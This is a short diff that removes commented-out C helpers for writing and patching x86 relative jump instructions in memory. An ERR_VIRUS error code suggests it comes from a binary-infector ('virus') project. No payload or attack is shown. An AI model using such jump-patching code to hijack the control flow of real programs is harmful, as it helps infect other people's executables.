@@ -21,26 +21,3 @@ bool		write_jump(void *buffer, int32_t value, uint8_t value_size)
 
 	return true;
 }
-
-// void		write_trailing_jump(void *buffer, int32_t value)
-// {
-// 	uint8_t	*opcode = (uint8_t*)(buffer);
-// 	int32_t	*arg    = (int32_t*)(buffer + 1);
-//
-// 	*opcode = 0xe9;
-// 	*arg    = value;
-// }
-//
-// bool		assign_jump32(void *jump_inst, int32_t rel)
-// {
-// 	size_t	len  = disasm_length(jump_inst, INSTRUCTION_MAXLEN);
-// #ifdef DEBUG
-// 	if (len < 5)
-// 		return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
-// #endif
-// 	int32_t	*arg = jump_inst + len - sizeof(int32_t);
-//
-// 	// deduct len since rel addressing is from the end of jump instruction
-// 	*arg = rel - len;
-// 	return true;
-// }
